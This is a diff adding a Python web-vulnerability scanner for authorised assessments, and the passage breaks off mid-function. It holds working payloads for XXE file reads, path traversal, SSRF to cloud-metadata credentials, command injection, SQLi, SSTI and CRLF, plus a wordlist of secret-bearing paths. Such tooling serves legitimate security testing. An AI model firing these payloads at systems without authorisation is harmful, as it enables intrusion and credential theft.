@@ -1,0 +1,1043 @@
+#!/usr/bin/env python3
+"""Deterministic web vulnerability probe.
+
+Tests one in-scope URL for a focused set of parameter- and path-based web vulns the
+template scanners can miss on dev stacks. Emits ONE compact JSON record to stdout for the
+VAPT-AI normalizer:
+
+    {"findings": [...], "trace": [{"url", "status", "cls", "note"}, ...]}
+
+The `trace` is a short, bounded list of every request the probe actually sent (status
+code, truncated URL, which class). It's for diagnostics only — the normalizer ignores
+it. Fully redacted of secrets.
+
+Classes tested (deterministic, in-band proof — no OAST required):
+  * open_redirect     — ?<param>=https://<canary>/… ⇒ Location: <canary host>
+  * path_traversal    — ?<param>=../../../etc/passwd ⇒ response body contains "root:x:"
+  * ssrf_localhost    — ?<param>=http://127.0.0.1:<p>/ ⇒ response reflects a local service
+                        banner or returns a status that proves the server made the request
+  * sensitive_content — GET of common admin/debug paths; body matches signatures
+  * xxe_echo          — POST a small XXE XML payload to any path (lab targets rarely gate
+                        this on Content-Type alone, so we try everywhere, not just
+                        /import|/upload).
+
+Authentication:
+  * Session cookie is fetched from Redis using VAPT_RUN_ID (same slot the orchestrator
+    cached after login — TTL-bounded, deleted at phase end). VAPT_WEB_LOGIN_COOKIE is kept
+    as a fallback for local/offline testing. Secrets never travel through the ledger, the
+    digest, the args, or stdout; only an opaque run_id reaches the subprocess.
+
+Safety:
+  * Only in-scope URL(s) accepted; off-host (incl. redirect target) ⇒ discard.
+  * Bounded request budget; honours a user-agent string.
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import re
+import sys
+from urllib.parse import urlencode, urljoin, urlparse
+
+try:
+    import requests
+except Exception as e:
+    print(json.dumps({"error": f"requests not available: {e}", "findings": []}))
+    sys.exit(0)
+
+_UA = "vapt-web-probe/1.0 (authorized assessment)"
+_TIMEOUT = 10
+_CANARY_HOST = "example.invalid"      # obviously-synthetic DNS token (in-band fallback)
+_CANARY_URL = f"https://{_CANARY_HOST}/vapt-canary"
+
+
+def _oast_canary(label: str) -> str | None:
+    """Return an OAST callback URL for blind detection, or None if OAST isn't live for
+    this run. The orchestrator starts an interactsh session when the webvuln phase
+    opens and stores the handle in Redis under the run_id; we read it here so blind
+    SSRF/XXE/SSTI/RCE payloads can inject a canary subdomain the target will touch.
+    Fail-safe: any Redis issue → None → probe falls back to in-band only (unchanged)."""
+    run_id = os.environ.get("VAPT_RUN_ID", "").strip()
+    if not run_id or not label:
+        return None
+    try:
+        import redis as _redis, json as _json
+        r = _redis.Redis.from_url(
+            os.environ.get("VAPT_REDIS_URL", "redis://localhost:6379/0"),
+            socket_timeout=3,
+        )
+        raw = r.get(f"vapt:oast:{run_id}")
+        if not raw:
+            return None
+        h = _json.loads(raw)
+        safe = "".join(c for c in str(label).lower() if c.isalnum() or c in "-")[:32]
+        if not safe:
+            return None
+        return f"http://{safe}.{h['domain']}/"
+    except Exception:
+        return None
+_TRACE_CAP = 40                       # soft cap: keep the per-run trace small
+
+# Common param names worth probing per class. The caller may also pin a specific `--param`
+# from an upstream signal (arjun/wapiti); we try the pinned name AND the common list, not
+# one or the other — the common list is cheap and sometimes the arjun pin missed the real
+# vulnerable param.
+_REDIRECT_PARAMS = ("next", "url", "redirect", "return", "to", "dest", "goto", "r", "u",
+                    "continue", "returnTo", "redir")
+_FILE_PARAMS = ("file", "path", "filename", "page", "doc", "name", "template", "include",
+                "src", "image", "logo", "download", "f", "load",
+                "img", "view", "item", "attachment", "source", "resource",
+                "asset", "static", "img_url", "pic", "picture")
+_SSRF_PARAMS = ("url", "uri", "target", "host", "callback", "feed", "fetch", "to",
+                "endpoint", "proxy", "redirect_uri", "image")
+
+# Sensitive-data signatures. Each is a documented, non-overlapping marker; the match set
+# makes the response really look like a secret dump, not just a page with the word "password".
+_SENS_PATTERNS = [
+    # --- file-system signatures (traversal proof + content disclosure) ---
+    (re.compile(r"\broot:x:\d+:\d+:"), "unix /etc/passwd"),
+    (re.compile(r"\bdaemon:x:\d+:\d+:"), "unix /etc/passwd (daemon)"),
+    (re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----"),
+     "private key material"),
+    (re.compile(r"-----BEGIN CERTIFICATE-----"), "x509 certificate material"),
+    (re.compile(r"\[fonts\]"), "windows win.ini"),
+    (re.compile(r"\[boot loader\]"), "windows boot.ini"),
+
+    # --- cloud credentials (AWS/GCP/Azure) ---
+    (re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "AWS access key id"),
+    (re.compile(r"\bASIA[0-9A-Z]{16}\b"), "AWS STS temporary key"),
+    (re.compile(r"\baws_secret_access_key\s*=\s*[A-Za-z0-9/+=]{40}", re.I),
+     "AWS secret access key"),
+    (re.compile(r"\bAIza[0-9A-Za-z\-_]{35}\b"), "Google API key"),
+    (re.compile(r"\bya29\.[0-9A-Za-z\-_]+\b"), "Google OAuth access token"),
+    (re.compile(r"\bghp_[0-9A-Za-z]{36}\b"), "GitHub personal access token"),
+    (re.compile(r"\bghs_[0-9A-Za-z]{36}\b"), "GitHub app server token"),
+    (re.compile(r"\bgho_[0-9A-Za-z]{36}\b"), "GitHub OAuth token"),
+    (re.compile(r"\bglpat-[0-9A-Za-z\-_]{20}\b"), "GitLab personal access token"),
+    (re.compile(r"\bxox[baprs]-[0-9A-Za-z\-]+\b"), "Slack token"),
+
+    # --- API / webhook / service tokens ---
+    (re.compile(r"\bsk-[A-Za-z0-9]{32,}\b"), "OpenAI / sk-prefixed API key"),
+    (re.compile(r"\bsk-ant-[A-Za-z0-9\-_]{20,}\b"), "Anthropic API key"),
+    (re.compile(r"\bSG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}\b"), "SendGrid API key"),
+    (re.compile(r"\bAC[a-f0-9]{32}\b"), "Twilio Account SID"),
+    (re.compile(r"\bSK[a-f0-9]{32}\b"), "Twilio API key"),
+    (re.compile(r"\bEAAC[0-9A-Za-z]{20,}\b"), "Facebook graph token"),
+    (re.compile(r"\brtmp://[^\s]{10,}"), "RTMP stream key"),
+
+    # --- JWTs & session tokens ---
+    (re.compile(r"\beyJ[A-Za-z0-9\-_]{10,}\.eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_]{10,}"),
+     "JWT token"),
+
+    # --- generic credential assignment patterns ---
+    (re.compile(r"\b(?:api[_-]?key|secret[_-]?key|access[_-]?token|private[_-]?key|"
+                r"client[_-]?secret|auth[_-]?token|bearer[_-]?token)"
+                r"['\"]?\s*[:=]\s*['\"][A-Za-z0-9+/=_\-]{16,}['\"]", re.I),
+     "credential-shaped value"),
+    (re.compile(r"\bDB_PASSWORD\s*=\s*\S+"), "env password"),
+    (re.compile(r"\bMYSQL_(?:ROOT_)?PASSWORD\s*=\s*\S+"), "mysql env password"),
+    (re.compile(r"\bPOSTGRES_PASSWORD\s*=\s*\S+"), "postgres env password"),
+    (re.compile(r"\bREDIS_PASSWORD\s*=\s*\S+"), "redis env password"),
+    (re.compile(r"\bFLASK_SECRET_KEY\b|\bSECRET_KEY\s*=\s*['\"][^'\"]{8,}"),
+     "flask secret key"),
+    (re.compile(r"\bDJANGO_SECRET_KEY\s*=\s*['\"][^'\"]{20,}"), "django secret key"),
+
+    # --- connection strings (DB URLs embed credentials) ---
+    (re.compile(r"\b(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?|redis|amqp)"
+                r"://[^\s:/@]+:[^\s@]+@[^\s/]+"),
+     "database connection string with credentials"),
+
+    # --- business-logic / app leak signals ---
+    (re.compile(r"invoice[_-]?(?:number|id)['\"]?\s*[:=]\s*['\"]?\d{3,}", re.I),
+     "invoice identifier"),
+    (re.compile(r"<title>phpLiteAdmin", re.I), "phpLiteAdmin surface"),
+    (re.compile(r"<title>phpMyAdmin", re.I), "phpMyAdmin surface"),
+    (re.compile(r"<title>Jenkins", re.I), "Jenkins surface"),
+    (re.compile(r"<title>Grafana", re.I), "Grafana surface"),
+    (re.compile(r"<title>Kibana", re.I), "Kibana surface"),
+
+    # --- debug/stacktrace disclosure (indicates DEBUG=True on prod) ---
+    (re.compile(r"Traceback \(most recent call last\):[\s\S]{0,200}File \""),
+     "python stack trace (DEBUG mode enabled)"),
+    (re.compile(r"<title>Werkzeug Debugger</title>", re.I),
+     "Werkzeug debugger exposed (RCE primitive)"),
+    (re.compile(r"<title>Django.*at /</title>", re.I),
+     "Django debug page exposed"),
+]
+# Admin / debug paths worth GET-ing on an authenticated session. DineHub-style apps often
+# expose /admin, /phpliteadmin.php, and /actuator-ish health paths without auth.
+_SENS_PATHS = (
+    # Admin / debug consoles
+    "/admin", "/admin/", "/admin/config", "/admin/logs", "/admin/debug",
+    "/console", "/debug", "/debug/", "/debug/vars", "/_debug_toolbar/",
+    "/.git/config", "/.git/HEAD", "/.svn/entries", "/.hg/hgrc",
+    # Framework-specific
+    "/phpliteadmin.php", "/phpLiteAdmin", "/phpmyadmin", "/phpMyAdmin",
+    "/wp-admin/", "/wp-config.php", "/wp-config.php.bak",
+    "/manager/html", "/manager/status",  # tomcat
+    "/jmx-console/", "/web-console/", "/invoker/JMXInvokerServlet",
+    "/axis2-admin/", "/axis2-web/",
+    # Spring/actuator (full set)
+    "/actuator", "/actuator/env", "/actuator/health", "/actuator/info",
+    "/actuator/beans", "/actuator/configprops", "/actuator/trace",
+    "/actuator/httptrace", "/actuator/heapdump", "/actuator/threaddump",
+    "/actuator/mappings", "/actuator/metrics", "/actuator/loggers",
+    # Env / config dumps
+    "/.env", "/.env.local", "/.env.production", "/config", "/config.json",
+    "/config.yml", "/config.yaml", "/app.config",
+    "/web.config", "/application.properties", "/application.yml",
+    "/settings.py", "/local_settings.py",
+    # Server status / monitoring
+    "/server-status", "/server-info", "/nginx_status",
+    "/metrics", "/status", "/healthz", "/health",
+    "/phpinfo.php", "/phpinfo", "/info.php", "/test.php",
+    # Backup / dump files
+    "/backup.sql", "/backup.zip", "/backup.tar.gz", "/backup.tar",
+    "/dump.sql", "/dump.rdb", "/db.sqlite", "/database.sql",
+    # CI / dev leaks
+    "/.docker/config.json", "/.dockercfg", "/.npmrc", "/.pypirc",
+    "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys",
+    "/credentials", "/secrets", "/secret",
+    # API docs that may leak surface
+    "/swagger.json", "/swagger-ui.html", "/swagger-ui/", "/api-docs",
+    "/openapi.json", "/graphql", "/graphiql",
+    # Flask-specific debugger (DineHub stack)
+    "/console", "/debugger",
+)
+
+# XXE payloads: (payload, response-signature regex, label). We try multiple file
+# reads AND multiple root-element names because the server often echoes using the
+# element names from our body — DineHub /admin/import echoes `<data><item>…</item>
+# </data>` verbatim, so a payload that uses the same element names matches the
+# echo shape. `root:x:` from /etc/passwd is the strongest signature (zero FP);
+# fall back to /etc/hostname (short) if the parser can't open /etc/passwd. For
+# Windows targets, read win.ini (`[fonts]` signature).
+_XXE_PROBES = (
+    # (payload, signature-regex, label)
+    (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE data [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n'
+        '<data><item>&e;</item></data>\n',
+        re.compile(r"\broot:x:\d+:\d+:"), "/etc/passwd expanded",
+    ),
+    (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]>\n'
+        '<r>&e;</r>\n',
+        re.compile(r"\broot:x:\d+:\d+:"), "/etc/passwd expanded (r)",
+    ),
+    (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE data [<!ENTITY e SYSTEM "file:///etc/hostname">]>\n'
+        '<data><item>&e;</item></data>\n',
+        re.compile(r"<item[^>]*>\s*([a-z0-9][a-z0-9.\-]{0,62})\s*</item>",
+                   re.IGNORECASE),
+        "/etc/hostname expanded (item)",
+    ),
+    (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/hostname">]>\n'
+        '<r>&e;</r>\n',
+        re.compile(r"<r[^>]*>\s*([a-z0-9][a-z0-9.\-]{0,62})\s*</r>",
+                   re.IGNORECASE),
+        "/etc/hostname expanded (r)",
+    ),
+    (
+        '<?xml version="1.0"?>\n'
+        '<!DOCTYPE data [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]>\n'
+        '<data><item>&e;</item></data>\n',
+        re.compile(r"\[fonts\]|\[extensions\]"), "win.ini expanded",
+    ),
+)
+
+
+def _in_scope(target_host: str, url: str) -> bool:
+    try:
+        return urlparse(url).hostname == target_host
+    except Exception:
+        return False
+
+
+def _redis_cookie(run_id: str) -> str | None:
+    """Fetch the cached session cookie from Redis (same slot the orchestrator wrote after
+    its one-shot login). Fails SAFE: any Redis issue → None → unauthenticated probe."""
+    if not run_id:
+        return None
+    try:
+        import redis
+    except Exception:
+        return None
+    try:
+        r = redis.Redis.from_url(
+            os.environ.get("VAPT_REDIS_URL", "redis://localhost:6379/0"),
+            socket_timeout=3,
+        )
+        raw = r.get(f"vapt:webcookie:{run_id}")
+        if not raw:
+            return None
+        return raw.decode() if isinstance(raw, bytes) else str(raw)
+    except Exception:
+        return None
+
+
+def _load_cookie() -> tuple[str, str]:
+    """Return (cookie, source). Source is 'redis', 'env', or 'none'."""
+    run_id = os.environ.get("VAPT_RUN_ID", "").strip()
+    c = _redis_cookie(run_id)
+    if c:
+        return c, "redis"
+    c = os.environ.get("VAPT_WEB_LOGIN_COOKIE", "").strip()
+    if c:
+        return c, "env"
+    return "", "none"
+
+
+class _Session:
+    """Thin wrapper so every request lands in the shared `trace` list for diagnostics."""
+    def __init__(self, cookie: str, insecure: bool):
+        s = requests.Session()
+        s.headers.update({"User-Agent": _UA, "Accept": "*/*"})
+        if cookie:
+            s.headers["Cookie"] = cookie
+        if insecure:
+            s.verify = False
+            try:
+                requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
+            except Exception:
+                pass
+        self.s = s
+        self.trace: list[dict] = []
+        # Hard cap on requests per invocation. Raised from 160 → 320 when the SSTI/SQLi/XSS
+        # probes landed — each new class fans out across ~6-7 param names × 4-7 payloads,
+        # and when stacked with the existing 7 classes the old cap sometimes starved the
+        # late ones. 320 covers the full probe at ~2.5x the common per-probe ceiling.
+        self.budget = 320
+
+    def _record(self, url: str, status: int | None, cls: str, note: str = ""):
+        if len(self.trace) >= _TRACE_CAP:
+            return
+        self.trace.append({"url": url[:200], "status": status,
+                           "cls": cls, "note": note[:100]})
+
+    def get(self, url: str, cls: str, allow_redirects: bool = False):
+        if self.budget <= 0:
+            return None
+        self.budget -= 1
+        try:
+            r = self.s.get(url, timeout=_TIMEOUT, allow_redirects=allow_redirects)
+            self._record(url, r.status_code, cls)
+            return r
+        except Exception as e:
+            self._record(url, None, cls, f"err:{type(e).__name__}")
+            return None
+
+    def post(self, url: str, data, headers, cls: str):
+        if self.budget <= 0:
+            return None
+        self.budget -= 1
+        try:
+            r = self.s.post(url, data=data, headers=headers,
+                            timeout=_TIMEOUT, allow_redirects=False)
+            self._record(url, r.status_code, cls)
+            return r
+        except Exception as e:
+            self._record(url, None, cls, f"err:{type(e).__name__}")
+            return None
+
+
+# Params explicitly present in the probed URL's query string (filled in main()).
+# These get PRIORITY in every _param_list() call — if the operator pointed us at
+# /download?file=foo, we probe `file` BEFORE the common list for the file-sink
+# classes, which is both faster and reduces noise. Empty when the URL has no
+# query string. Mutated at the start of main() so helper functions see it.
+_URL_QUERY_PARAMS: tuple[str, ...] = ()
+
+
+def _param_list(pinned: str, common: tuple[str, ...]) -> list[str]:
+    """Pinned param FIRST, then any URL-query params that match the class list,
+    then the full common list — de-duped. We no longer skip the common list when
+    a pin is present: a wrong pin would otherwise leave the real vulnerable
+    param uncovered.
+
+    The URL-query intermediate layer is Group E (query-param aware probing):
+    if the operator pointed us at `?file=x` and this class's common list
+    contains `file`, we try `file` SECOND (right after the pin) rather than
+    waiting for it to come up in the common iteration order. Keeps the probe
+    deterministic AND responsive to the URL the planner picked.
+    """
+    seen: set[str] = set()
+    out: list[str] = []
+    # URL-query params restricted to the class list — only the ones this class
+    # knows how to exercise, so we don't blow the budget on irrelevant names.
+    common_set = {c.lower() for c in common}
+    url_hits = tuple(p for p in _URL_QUERY_PARAMS if p.lower() in common_set)
+    for p in ((pinned,) if pinned else ()) + url_hits + common:
+        p = (p or "").strip()
+        if p and p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out
+
+
+def _probe_open_redirect(sess: _Session, base_url: str, pinned_param: str) -> list[dict]:
+    out: list[dict] = []
+    for p in _param_list(pinned_param, _REDIRECT_PARAMS):
+        url = f"{base_url}{'&' if '?' in base_url else '?'}{urlencode({p: _CANARY_URL})}"
+        r = sess.get(url, cls="open_redirect", allow_redirects=False)
+        if r is None:
+            continue
+        loc = r.headers.get("Location", "")
+        if 300 <= r.status_code < 400 and _CANARY_HOST in loc:
+            out.append({"type": "open_redirect", "severity": "medium",
+                        "url": url, "param": p, "evidence": f"Location: {loc[:200]}",
+                        "confirmed": True})
+            return out
+        if r.text and f'url={_CANARY_URL}'.lower() in r.text.lower():
+            out.append({"type": "open_redirect", "severity": "medium",
+                        "url": url, "param": p,
+                        "evidence": "meta-refresh to canary host",
+                        "confirmed": True})
+            return out
+    return out
+
+
+_PASSWD_SIGS = [
+    (re.compile(r"\broot:x:\d+:\d+:"),            "unix /etc/passwd (root)"),
+    (re.compile(r"\bdaemon:x:\d+:\d+:"),          "unix /etc/passwd (daemon)"),
+    (re.compile(r"\bbin:x:\d+:\d+:"),             "unix /etc/passwd (bin)"),
+    (re.compile(r"\bnobody:x:\d+:\d+:"),          "unix /etc/passwd (nobody)"),
+    # HTML-entity-encoded version (templates that pass response through h/escape)
+    (re.compile(r"\broot&#58;x&#58;\d+&#58;\d+"), "unix /etc/passwd (html-encoded)"),
+]
+_WININI_SIGS = ("[fonts]", "[extensions]", "[mail]", "; for 16-bit app support")
+
+
+def _probe_path_traversal(sess: _Session, base_url: str, pinned_param: str) -> list[dict]:
+    payloads = ("../../../../../../etc/passwd",
+                "..%2f..%2f..%2f..%2fetc%2fpasswd",
+                "....//....//....//....//etc/passwd",       # ../ filter bypass
+                "..\\..\\..\\..\\..\\windows\\win.ini",
+                "..%5c..%5c..%5cwindows%5cwin.ini",
+                "/etc/passwd",
+                "file:///etc/passwd",
+                "C:\\windows\\win.ini")
+    out: list[dict] = []
+    for p in _param_list(pinned_param, _FILE_PARAMS):
+        for payload in payloads:
+            url = f"{base_url}{'&' if '?' in base_url else '?'}{urlencode({p: payload})}"
+            r = sess.get(url, cls="path_traversal", allow_redirects=True)
+            if r is None or not r.text:
+                continue
+            for rx, label in _PASSWD_SIGS:
+                if rx.search(r.text):
+                    out.append({"type": "path_traversal", "severity": "high",
+                                "url": url, "param": p,
+                                "evidence": label,
+                                "confirmed": True})
+                    return out
+            if any(s in r.text for s in _WININI_SIGS):
+                out.append({"type": "path_traversal", "severity": "high",
+                            "url": url, "param": p,
+                            "evidence": "windows win.ini signature",
+                            "confirmed": True})
+                return out
+            # Binary file response (ELF/PK/PE/PDF) when the probe asked for a well-known
+            # unix/windows file: strong signal the server opened an arbitrary file and
+            # returned it, even without a textual signature.
+            head = r.content[:8] if r.content else b""
+            if head.startswith((b"\x7fELF", b"MZ")) and (
+                    "passwd" in payload or "win.ini" in payload):
+                out.append({"type": "path_traversal", "severity": "high",
+                            "url": url, "param": p,
+                            "evidence": f"binary file served for {payload} (magic {head[:4]!r})",
+                            "confirmed": True})
+                return out
+    return out
+
+
+def _probe_ssrf_localhost(sess: _Session, base_url: str, pinned_param: str) -> list[dict]:
+    # In-band probes: ask the target to fetch common local URLs and reflect their
+    # banners OR cloud-metadata-shaped content. Catches reflecting SSRF (DineHub's
+    # /fetch/logo?url=http://127.0.0.1:22/ style) AND metadata-exfil SSRF where
+    # the app serves a MOCK /latest/meta-data/ on its own port (DineHub's
+    # /admin/fetch_report?url=http://127.0.0.1:5000/latest/meta-data/ pattern,
+    # which leaks AKIA-shaped AWS creds). We dynamically add 127.0.0.1:<port>
+    # for the base URL's own port AND the common app-dev ports (5000/8080/3000/
+    # 8000) so a loopback-metadata leak gets caught regardless of discovery
+    # ordering, in addition to the external 169.254.169.254 (usually blocked).
+    base_port = urlparse(base_url).port
+    _candidate_ports = []
+    if base_port:
+        _candidate_ports.append(str(base_port))
+    for p in (5000, 8080, 3000, 8000, 80, 5001):
+        if str(p) not in _candidate_ports:
+            _candidate_ports.append(str(p))
+    _mock_metadata = tuple(
+        f"http://127.0.0.1:{p}/latest/meta-data/" for p in _candidate_ports[:3]
+    ) + tuple(
+        f"http://127.0.0.1:{p}/latest/meta-data/iam/security-credentials/"
+        for p in _candidate_ports[:2]
+    )
+    probes = (
+        "http://127.0.0.1:22/", "http://127.0.0.1:80/", "http://127.0.0.1/",
+        "http://localhost/", "http://169.254.169.254/latest/meta-data/",
+    ) + _mock_metadata
+    # Signature now matches local-service banners AND cloud-credential patterns
+    # that any metadata-leak SSRF would surface — AKIA/ASIA access keys, AWS IAM
+    # payload JSON ("iam-credentials"/"access_key"/"SecretAccessKey"), Google
+    # computeMetadata markers, Azure IMDS fields.
+    sig_re = re.compile(
+        r"\bSSH-\d\.\d-|<title>IIS Windows|<title>Welcome to nginx|<title>Apache|"
+        r"\bami-id\b|\binstance-id\b|\biam-credentials\b|\bAccessKeyId\b|"
+        r"\bSecretAccessKey\b|\bAKIA[0-9A-Z]{16}\b|\bASIA[0-9A-Z]{16}\b|"
+        r"\baccess_key\b|computeMetadata|\bIMDS\b|Metadata-Flavor",
+        re.IGNORECASE)
+    out: list[dict] = []
+    for p in _param_list(pinned_param, _SSRF_PARAMS):
+        # Blind SSRF via OAST — fire first per param so the callback fires even if the
+        # in-band probes return empty bodies.
+        oast = _oast_canary(f"ssrf-{p}")
+        if oast:
+            url = f"{base_url}{'&' if '?' in base_url else '?'}{urlencode({p: oast})}"
+            sess.get(url, cls="ssrf_blind_oast", allow_redirects=False)
+        for probe in probes:
+            url = f"{base_url}{'&' if '?' in base_url else '?'}{urlencode({p: probe})}"
+            r = sess.get(url, cls="ssrf_localhost", allow_redirects=True)
+            if r is None or not r.text:
+                continue
+            m = sig_re.search(r.text)
+            if m:
+                # Promote severity to critical when ANYWHERE in the response body
+                # contains credential material — not just the first-matched token.
+                # DineHub's mock metadata leads with "ami-id" (a banner-like marker)
+                # but the AKIA key and iam-credentials sit later in the same body;
+                # a cred_hit scan over the full body avoids misranking a critical
+                # credential leak as merely high.
+                body_lo = r.text.lower()
+                cred_hit = any(k in body_lo for k in
+                               ("akia", "asia", "iam-credentials", "accesskeyid",
+                                "secretaccesskey", "access_key"))
+                hit = m.group(0)
+                sev = "critical" if cred_hit else "high"
+                evidence = (f"metadata/credentials exfiltrated via SSRF ({probe}) "
+                            f"— response matched {hit[:30]!r} + credential-shaped "
+                            f"tokens in body") if cred_hit else \
+                           f"local service banner reflected ({probe})"
+                out.append({"type": "ssrf_localhost", "severity": sev,
+                            "url": url, "param": p,
+                            "evidence": evidence, "confirmed": True})
+                return out
+    return out
+
+
+def _probe_sensitive_content(sess: _Session, base: str, target_host: str) -> list[dict]:
+    out: list[dict] = []
+    # The explicit --url the caller passed IS a probe target too — scan its body
+    # for credential patterns before walking the generic wordlist. The planner
+    # routinely points this class at specific known-sensitive endpoints (e.g.
+    # /admin/config, discovered JSON config dumps), and the old implementation
+    # ignored that URL entirely in favour of its hardcoded path list, so a
+    # confirmed secret-leaking endpoint produced no finding.
+    bp = urlparse(base)
+    _targets: list[tuple[str, str]] = []
+    if bp.path and bp.path not in ("", "/"):
+        _targets.append((base, bp.path))
+    for p in _SENS_PATHS:
+        full = urljoin(base, p)
+        _targets.append((full, p))
+    _seen: set[str] = set()
+    for full, p in _targets:
+        if full in _seen or not _in_scope(target_host, full):
+            continue
+        _seen.add(full)
+        r = sess.get(full, cls="sensitive_content", allow_redirects=True)
+        if r is None or r.status_code >= 400 or not r.text:
+            continue
+        for rx, label in _SENS_PATTERNS:
+            m = rx.search(r.text)
+            if m:
+                out.append({"type": "sensitive_content", "severity": "high",
+                            "url": full, "param": "",
+                            "evidence": f"{label} at {p} ({m.group(0)[:60]}…)",
+                            "confirmed": True})
+                break
+    return out
+
+
+_CMD_PARAMS = ("cmd", "command", "exec", "query", "run", "ping", "host", "ip",
+               "address", "domain", "target", "name", "arg")
+
+# Params commonly accepted by templating sinks (name/comment/review text rendered via
+# Jinja2 / Mako / FreeMarker / Twig). "name" dominates — most form apps show the user's
+# submitted name back inside a template string before storing/displaying it.
+_SSTI_PARAMS = ("name", "comment", "message", "content", "body", "description",
+                "title", "subject", "greeting", "template", "input", "q", "query",
+                "search", "username", "email", "feedback", "review")
+_SSTI_PROBES = (
+    ("{{7*7}}",      "49"),
+    ("{{7*'7'}}",    "7777777"),
+    ("${7*7}",       "49"),
+    ("<%=7*7%>",     "49"),
+    ("#{7*7}",       "49"),
+    ("[[${7*7}]]",   "49"),            # Thymeleaf
+    ("{{7*7}}}",     "49"),            # extra brace handling
+)
+
+# Params that typically bind to a SQL query (lookup/filter/sort/user-record).
+_SQLI_PARAMS = ("id", "user_id", "uid", "user", "username", "email", "search",
+                "q", "query", "name", "page", "sort", "order", "filter", "cat",
+                "category", "product", "pid", "item", "post", "news", "article",
+                "rid", "restaurant_id", "menu_id", "order_id")
+_SQLI_BOOLEAN_PROBES = (
+    ("' OR '1'='1",   "' AND '1'='2"),
+    ('" OR "1"="1',   '" AND "1"="2'),
+    ("1 OR 1=1-- ",   "1 AND 1=2-- "),
+    ("1' OR '1'='1'-- ",  "1' AND '1'='2'-- "),
+)
+_SQLI_ERROR_SIGS = re.compile(
+    r"you have an error in your sql syntax|"
+    r"warning:\s*mysql|"
+    r"unclosed quotation mark|"
+    r"ORA-\d{5}|"
+    r"PostgreSQL\b.{0,80}\bERROR|"
+    r"psycopg2\.\w+Error|"
+    r"sqlite3\.OperationalError|"
+    r"System\.Data\.SqlClient|"
+    r"MySQLSyntaxErrorException|"
+    r"org\.hibernate\.exception|"
+    r"java\.sql\.SQLException",
+    re.IGNORECASE)
+
+# Params commonly reflected into HTML (search terms, display names, free-text comments).
+_XSS_PARAMS = ("q", "query", "s", "search", "name", "comment", "message", "input",
+               "term", "keyword", "title", "content", "body", "feedback", "review",
+               "username", "email", "redirect")
+
+
+def _probe_cmd_injection(sess: _Session, base_url: str, pinned_param: str) -> list[dict]:
+    """In-band OS command injection via timing. We measure a baseline request, then send a
+    `; sleep N` payload per common injection shape; if the slow request is at least N-1
+    seconds slower than baseline on both the first attempt AND a confirmation retry, it's a
+    confirmed command injection. Timing-only on purpose — no payload that exfiltrates data,
+    no OAST, no process-side-effect probe. Each probe uses a canary delay that the server
+    can't short-circuit (fixed 6s, randomized per run would be nicer but adds state we don't
+    need for a lab target). Honours the overall request budget."""
+    import time
+    DELAY = 6
+    out: list[dict] = []
+    # Baseline latency for THIS endpoint (one hit, not an average — the normalizer trace
+    # keeps the status if the operator wants to inspect).
+    t0 = time.time()
+    base = sess.get(base_url, cls="cmd_injection", allow_redirects=True)
+    baseline = (time.time() - t0) if base is not None else 0.0
+    # Payload shapes that span the common injection sinks (Unix shell, PowerShell, cmd.exe,
+    # and the `|`-style pipeline that bypasses naive `;` filters).
+    shapes = (
+        f"; sleep {DELAY}",
+        f"| sleep {DELAY}",
+        f"$(sleep {DELAY})",
+        f"`sleep {DELAY}`",
+        f"& timeout /t {DELAY}",       # Windows cmd.exe
+        f"'; Start-Sleep -s {DELAY} ;'",   # PowerShell
+    )
+    for p in _param_list(pinned_param, _CMD_PARAMS):
+        for shape in shapes:
+            url = f"{base_url}{'&' if '?' in base_url else '?'}{urlencode({p: shape})}"
+            t = time.time()
+            r = sess.get(url, cls="cmd_injection", allow_redirects=True)
+            elapsed = time.time() - t
+            if r is None:
+                continue
+            if elapsed < baseline + (DELAY - 1):
+                continue
+            # Confirm with a retry — a single slow request is often just a slow endpoint,
+            # not injection. A SECOND slow response to the same payload rules that out.
+            t2 = time.time()
+            r2 = sess.get(url, cls="cmd_injection", allow_redirects=True)
+            elapsed2 = time.time() - t2
+            if r2 is None or elapsed2 < baseline + (DELAY - 1):
+                continue
+            out.append({"type": "cmd_injection", "severity": "critical",
+                        "url": url, "param": p,
+                        "evidence": f"delayed response ({elapsed:.1f}s + {elapsed2:.1f}s "
+                                    f"vs baseline {baseline:.1f}s) for shape {shape!r}",
+                        "confirmed": True})
+            return out
+    return out
+
+
+def _probe_crlf(sess: _Session, base_url: str, pinned_param: str) -> list[dict]:
+    """CRLF injection: inject `\\r\\n<header>: <value>` and look for that header reflected
+    in the server's response. Proof is a header the server now emits that didn't exist on
+    the baseline response. Shares the open_redirect param list because `?next=` style
+    params that build a Location header are the usual sink."""
+    out: list[dict] = []
+    canary_hdr = "X-Vapt-Canary"
+    canary_val = "1"
+    payloads = (
+        f"vapt%0d%0a{canary_hdr}:%20{canary_val}",
+        f"vapt\r\n{canary_hdr}: {canary_val}",   # some servers URL-decode on their own
+    )
+    for p in _param_list(pinned_param, _REDIRECT_PARAMS):
+        for payload in payloads:
+            url = f"{base_url}{'&' if '?' in base_url else '?'}{p}={payload}"
+            r = sess.get(url, cls="crlf", allow_redirects=False)
+            if r is None:
+                continue
+            if canary_hdr.lower() in (h.lower() for h in r.headers.keys()):
+                out.append({"type": "crlf", "severity": "medium",
+                            "url": url, "param": p,
+                            "evidence": f"server emitted injected header {canary_hdr}",
+                            "confirmed": True})
+                return out
+    return out
+
+
+def _probe_xxe(sess: _Session, base_url: str) -> list[dict]:
+    """POST XXE payloads: in-band variants (file read via SYSTEM entity + echo) AND a
+    blind-OOB variant (external DTD fetch — if the server resolves SYSTEM entities,
+    interactsh captures the DNS lookup for our canary host). The in-band set uses
